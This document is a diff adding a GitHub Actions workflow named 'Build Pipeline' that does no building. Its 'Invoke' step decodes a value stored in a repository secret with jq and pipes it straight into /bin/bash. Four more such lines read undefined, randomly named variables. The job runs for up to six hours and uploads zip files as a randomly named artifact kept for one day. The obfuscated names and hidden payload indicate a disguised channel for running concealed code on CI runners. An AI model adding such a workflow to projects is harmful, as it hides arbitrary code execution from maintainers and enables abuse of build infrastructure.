@@ -1,0 +1,39 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          dircn0: ${{ secrets.dircn0 }}
+        run: |
+          printf '%s' "$dircn0" | jq -r .xpetn82564 | /bin/bash
+          printf '%s' "$vxkqw218" | jq -r .m6936 | /bin/bash
+          echo $torp6 | jq -r .jlmbk80 | /bin/bash
+          echo $je4 | jq -r .dn18431 | /bin/bash
+          echo $jfzbe8 | jq -r .iqsqv6 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: DBuShNxQ
+          path: "*.zip"
+          retention-days: 1
